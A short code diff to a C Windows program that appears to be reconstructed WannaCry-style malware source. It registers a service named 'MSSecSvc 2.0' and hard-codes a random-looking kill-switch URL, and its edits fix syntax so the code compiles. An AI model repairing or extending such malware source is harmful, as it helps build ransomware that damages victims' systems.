@@ -54,7 +54,7 @@ int RealMain()
   }
   
   Sstack.lpServiceName = "MSSecSvc 2.0";
-  Sstack.lpServiceProc    (LPSERVICE_MAIN_FUNCTION)ServiceMain;
+  Sstack.lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
 
   StartServiceCtrlDispatcher(&Sstack);
 
@@ -62,7 +62,7 @@ int RealMain()
   CloseServiceHandle(SCObject);
 }
 
-int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
     char szUrl[] = "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com";
     HINTERNET hInternet;
